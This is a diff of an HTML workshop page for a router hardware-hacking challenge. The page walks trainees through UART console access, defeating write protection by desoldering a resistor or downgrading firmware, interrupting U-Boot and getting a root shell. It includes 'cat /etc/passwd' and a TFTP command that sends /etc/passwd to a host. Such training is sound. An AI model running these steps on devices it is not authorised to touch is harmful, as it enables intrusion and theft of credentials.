@@ -35,7 +35,7 @@
       <span>CYBERBOOTCAMP 2026</span>
     </div>
     <h1>HACK THE<br>ROUTER<span class="cursor"></span></h1>
-    <p class="subtitle">A hands-on challenge at the <b><a href="https://challengethecyber.nl/cyberbootcamp/" target="_blank" rel="noopener">Challenge the Cyber</a></b> cyberbootcamp 2026, by <b><a href="https://warpnet.nl" target="_blank" rel="noopener">Warpnet</a></b> &amp; <b><a href="https://roaldnefs.com" target="_blank" rel="noopener">Roald Nefs</a></b> &middot; Crack the case, find the pads, dump the flash.</p>
+    <p class="subtitle">Take a ten-euro router apart until it gives up a root shell: find the debug pads, break in over UART, and lift its firmware straight off the flash chip. A hands-on challenge at the <b><a href="https://challengethecyber.nl/cyberbootcamp/" target="_blank" rel="noopener">Challenge the Cyber</a></b> cyberbootcamp 2026, by <b><a href="https://warpnet.nl" target="_blank" rel="noopener">Warpnet</a></b> &amp; <b><a href="https://roaldnefs.com" target="_blank" rel="noopener">Roald Nefs</a></b>.</p>
   </header>
 
   <!-- Boot log intro -->
@@ -181,7 +181,7 @@
 
   <!-- ===================================================== -->
   <h2 style="border:none;">Section 2 // UART shell &amp; live enumeration</h2>
-  <p>Time to talk to the hidden computer directly. The UART is a serial console the firmware prints to, and often drops a <b>root shell</b> on, no password.</p>
+  <p>Time to talk to the hidden computer directly. The UART is a serial console the firmware prints to. You'll wire it up and <b>read</b> the boot log, meet the <b>write protection</b> that stops you typing, then defeat it to land an interactive <b>root shell</b>.</p>
 
   <!-- STEP: UART wiring -->
   <div class="step">
@@ -209,31 +209,38 @@
     </div>
   </div>
 
-  <h3>Challenge 07 // Initiating a UART shell</h3>
-  <p>Find the pads, wire them up, and open a console. Which pad is which? <b>GND</b> shows continuity to a known ground (multimeter, continuity mode). <b>VCC</b> sits at a steady 3.3V. <b>TX</b> flickers with data the instant the board boots, so catch it with the logic analyzer (or a multimeter twitching on DC volts). Whatever's left is <b>RX</b>.</p>
+  <h3>Challenge 07 // Open and read the serial console</h3>
+  <p>Find the pads, wire them up, and open a console to <b>read</b> what the board prints. Which pad is which? <b>GND</b> shows continuity to a known ground (multimeter, continuity mode). <b>VCC</b> sits at a steady 3.3V. <b>TX</b> flickers with data the instant the board boots, so catch it with the logic analyzer (or a multimeter twitching on DC volts). Whatever's left is <b>RX</b>.</p>
   <pre><span class="c"># open the console once wired (Linux)</span>
 <span class="k">picocom</span> -b <span class="p">115200</span> /dev/ttyUSB0
 <span class="c"># or: screen /dev/ttyUSB0 115200</span></pre>
+  <p>Power-cycle the board and <b>watch it boot</b>. The log is a goldmine: bootloader version, memory map, <b>flash partition offsets</b>, kernel command line, and which services start. All of it just by reading, no typing required.</p>
   <ul class="mission">
     <li><label><input type="checkbox"><span class="task">Identify the 4 UART pads (GND, VCC, TX, RX) with multimeter + logic analyzer <span class="pts">+20</span></span></label></li>
     <li><label><input type="checkbox"><span class="task">Solder header pins and wire the CP2102 (TX↔RX, RX↔TX, GND↔GND) <span class="pts">+15</span></span></label></li>
-    <li><label><input type="checkbox"><span class="task">Open a serial console at 115200 8N1 and get a shell <span class="pts">+30</span></span></label></li>
+    <li><label><input type="checkbox"><span class="task">Open a console at 115200 8N1 and watch the full power-on boot log <span class="pts">+20</span></span></label></li>
+    <li><label><input type="checkbox"><span class="task">Read off the bootloader (U-Boot) version and the kernel/rootfs flash offsets <span class="pts">+15</span></span></label></li>
   </ul>
 
-  <div class="note warn">
-    <div class="label">⚠ Newer revisions fight back</div>
-    Later hardware revisions add <b>write protection on the console</b>: a <b>pull-up resistor</b> is fitted on the UART <b>RX</b> pad. You can still read the boot log, but the board ignores anything you type, so no interactive shell. The resistor can simply be <b>removed</b> to restore input. Ask a volunteer to help you desolder it.
-  </div>
+  <h3>The write protection</h3>
+  <p>Reading works. Now try typing into the console: on these boards, nothing happens. The console is <b>write-protected</b>, in up to two layers.</p>
+  <p><b>Hardware.</b> A <b>pull-down resistor</b> (<b>R18</b>, ~1kΩ, on these v14 boards) sits on the UART <b>RX</b> line and holds it low, so the adapter's signal never rises high enough to register and the board ignores anything you type. The resistor can simply be <b>removed</b> to restore input. Ask a volunteer to help you desolder it.</p>
+  <figure style="margin:14px auto 0;max-width:400px;text-align:center;">
+    <img src="images/uart-r18.jpg" alt="Close-up of the TL-WR841N PCB showing the 4-pin UART header labelled VCC, RX, GND, TX, with the R18 pull-down resistor on the RX line." style="width:100%;border:1px solid var(--rule);border-radius:4px;" decoding="async" loading="lazy">
+    <figcaption style="font-size:12px;color:var(--dim);margin-top:6px;">R18 is the pull-down on the RX line: the hardware write protection. Desolder it and the console accepts input again.</figcaption>
+  </figure>
+  <p><b>Software.</b> Beyond the resistor, some <b>newer firmware</b> locks the console in software too: even with RX electrically fixed, a locked build refuses to drop a shell. This is verified on later v14 builds. The way around it is an <b>older firmware</b> that doesn't lock the console, like the oldest V14 EU build linked in <b>Challenge 04</b>.</p>
 
-  <h3>Challenge 08 // Boot logs &amp; the bootloader</h3>
-  <p>Power-cycle the board with the console open and <b>watch it boot</b>. The log is a goldmine: bootloader version, memory map, <b>flash partition offsets</b>, kernel command line, which services start. Most U-Boot builds also let you <b>interrupt</b> the boot. Mash a key (often any key, or <code class="inline">tpl</code>/<code class="inline">Esc</code>) during the countdown to drop to the <code class="inline">=&gt;</code> prompt.</p>
+  <h3>Challenge 08 // Write to the console</h3>
+  <p>Make the board <b>listen</b>. Beat the hardware protection, then get a foothold: interrupt the bootloader on the way up, or land in the firmware's shell. Most U-Boot builds let you <b>interrupt</b> the boot by mashing a key (often any key, or <code class="inline">tpl</code>/<code class="inline">Esc</code>) during the countdown to drop to the <code class="inline">=&gt;</code> prompt.</p>
   <pre><span class="c"># at the U-Boot prompt</span>
 <span class="k">printenv</span>          <span class="c"># boot args, bootcmd, flash layout</span>
 <span class="k">bdinfo</span>            <span class="c"># board info: RAM, clocks</span></pre>
   <ul class="mission">
-    <li><label><input type="checkbox"><span class="task">Capture the full power-on boot log <span class="pts">+15</span></span></label></li>
-    <li><label><input type="checkbox"><span class="task">Identify the bootloader (U-Boot) version and the kernel/rootfs flash offsets <span class="pts">+15</span></span></label></li>
-    <li><label><input type="checkbox"><span class="task">Interrupt boot and reach the U-Boot prompt <span class="pts">+20</span></span></label></li>
+    <li><label><input type="checkbox"><span class="task">Confirm it's read-only: type into the console and watch nothing register <span class="pts">+10</span></span></label></li>
+    <li><label><input type="checkbox"><span class="task">Restore input: remove R18 (ask a volunteer to desolder it), and if the console stays locked, downgrade to the older firmware from Challenge 04 <span class="pts">+20</span></span></label></li>
+    <li><label><input type="checkbox"><span class="task">Interrupt boot and reach the U-Boot prompt (<code class="inline">printenv</code>, <code class="inline">bdinfo</code>) <span class="pts">+20</span></span></label></li>
+    <li><label><input type="checkbox"><span class="task">Get an interactive root shell and run a command (e.g. <code class="inline">cat /etc/passwd</code>) <span class="pts">+25</span></span></label></li>
   </ul>
 
   <h3>Challenge 09 // Using TFTP to exfil files <span class="stamp">CAUTION</span></h3>
@@ -241,10 +248,6 @@
   <pre><span class="c"># on the router shell: push a file to your host</span>
 <span class="k">tftp</span> -p -l /etc/passwd <span class="p">192.168.0.100</span>
 <span class="c"># -p = put, -l = local file, then the host IP</span></pre>
-  <div class="note warn">
-    <div class="label">⚠ Same network</div>
-    Your host's TFTP server has to be reachable from the router: same subnet, firewall open on UDP/69. If a transfer hangs, that's almost always the firewall or a wrong host IP.
-  </div>
   <ul class="mission">
     <li><label><input type="checkbox"><span class="task">Stand up a TFTP server on your host <span class="pts">+10</span></span></label></li>
     <li><label><input type="checkbox"><span class="task">Exfil a config / credential file (e.g. <code class="inline">/etc/passwd</code>) <span class="pts">+20</span></span></label></li>
